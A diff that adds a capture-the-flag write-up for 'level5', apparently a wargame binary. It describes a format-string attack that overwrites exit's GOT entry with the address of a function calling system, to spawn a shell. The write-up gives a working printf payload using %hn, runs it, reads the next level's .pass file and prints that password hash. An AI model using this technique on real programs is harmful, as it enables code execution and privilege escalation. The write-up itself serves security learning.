@@ -1,0 +1,56 @@
+
+██╗     ███████╗██╗   ██╗███████╗██╗         ███████╗
+██║     ██╔════╝██║   ██║██╔════╝██║         ██╔════╝
+██║     █████╗  ██║   ██║█████╗  ██║         ███████╗
+██║     ██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║         ╚════██║
+███████╗███████╗ ╚████╔╝ ███████╗███████╗    ███████║
+╚══════╝╚══════╝  ╚═══╝  ╚══════╝╚══════╝    ╚══════╝
+                                                    
+
+objdump -d level5
+
+There are two interesting functions: <o> and <n>
+
+Using the same method as in the previous exercise, we determine the offset:
+-> 4
+
+The function <o> is never called and contains a call to <system>
+We can assume that this is the function that will execute the /bin/sh.
+
+We notice that there is a call to <exit> at the end of the function <n>.
+We will rewrite the GOT to modify this call to <exit> by a call to the function <o> (that will execute the /bin/sh)
+
+Let's dislay the GOT with:
+-> objdump -R level5
+
+The address of <exit> is:
+-> 0x08049838
+
+It is this address that we want to modify to make it call the function <o>.
+
+Using objdump -d we know that the address of the function <o> is:
+-> 0x080484a4
+
+So we will simply replace the address 0x08049838 by 0x080484a4.
+
+
+These two addresses start with 0x0804, we will just have to modify the last 4 digts (the last two bytes)
+
+We will replace 9838 by 84a4.
+
+84a4(hexa) equals to 33956(decimal)
+
+To indicate that we just want to modify the last two bytes, we use 'hn' instead of 'n'.
+
+python -c "print '\x38\x98\x04\x08' + '%33952d' + '%4\$hn'" > /tmp/file
+
+cat /tmp/file - | ./level5
+
+whoami
+
+cd ../level6 && cat .pass
+
+|══════════════════════════════════════════════════════════════════|
+| d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31 |
+|══════════════════════════════════════════════════════════════════|
+
